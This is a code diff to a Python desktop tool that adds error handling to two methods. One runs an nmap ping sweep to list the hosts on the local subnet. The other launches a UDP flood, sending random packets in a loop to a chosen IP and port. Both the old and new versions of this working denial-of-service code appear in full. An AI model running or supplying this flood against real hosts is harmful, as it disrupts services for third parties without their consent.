@@ -42,23 +42,27 @@ class MyWindow(QtWidgets.QMainWindow,Ui_MainWindow):
         sys.stdout = sys.__stdout__
 
     def SearchIp(self):
-        self.listWidget.clear()
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        host = s.getsockname()[0]
-        #print(host)
-        s.close()
-        nm = nmap.PortScanner()
-        l = nm.scan(hosts = f'{host}/24', arguments = '-sn')
-        p = l['scan'].keys()
-        p = list(p)
-        LenList = len(p)
-        for i in range(LenList):
-            item = QtWidgets.QListWidgetItem()
-            item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsUserCheckable|QtCore.Qt.ItemIsEnabled|QtCore.Qt.ItemIsTristate)
-            item.setData(QtCore.Qt.UserRole,'IP')
-            item.setText(p[i])
-            self.listWidget.addItem(item)
+        try:
+            self.listWidget.clear()
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            host = s.getsockname()[0]
+            #print(host)
+            s.close()
+            nm = nmap.PortScanner()
+            l = nm.scan(hosts = f'{host}/24', arguments = '-sn')
+            p = l['scan'].keys()
+            p = list(p)
+            LenList = len(p)
+            for i in range(LenList):
+                item = QtWidgets.QListWidgetItem()
+                item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsUserCheckable|QtCore.Qt.ItemIsEnabled|QtCore.Qt.ItemIsTristate)
+                item.setData(QtCore.Qt.UserRole,'IP')
+                item.setText(p[i])
+                self.listWidget.addItem(item)
+        except:
+            print("Error In Searching for IPs")
+
     def search_ip_thread(self):
         thread = threading.Thread(target=self.SearchIp)
         thread.start()
@@ -81,22 +85,26 @@ class MyWindow(QtWidgets.QMainWindow,Ui_MainWindow):
             time.sleep(5)
     
     def DOS(self):
-        if not self.selected_ip.text() == "":
-            self.End_Flag = False
-            sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-            bytes=random._urandom(1024)
-            self.ip = self.selected_ip.text()
-            self.port = int(self.comboBox.currentText())
-            th = threading.Thread(target=self.writeinfo)
-            th.setDaemon(True)
-            th.start()    
-            while not self.End_Flag:
-                sock.sendto(bytes,(self.ip,self.port)) 
-                self.sent = self.sent+1
-        else:
-            print("You need to enter an IP !")
-        
-        print("dos ended")
+        try:
+            if not self.selected_ip.text() == "":
+                self.End_Flag = False
+                sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+                bytes=random._urandom(1024)
+                self.ip = self.selected_ip.text()
+                self.port = int(self.comboBox.currentText())
+                th = threading.Thread(target=self.writeinfo)
+                th.setDaemon(True)
+                th.start()    
+                while not self.End_Flag:
+                    sock.sendto(bytes,(self.ip,self.port)) 
+                    self.sent = self.sent+1
+            else:
+                print("You need to enter an IP !")
+        except:
+            self.End_Flag = True
+            print("Error in DOS")
+
+        print("DOS ended")
 
     def Cancel_op(self):
         self.End_Flag = True
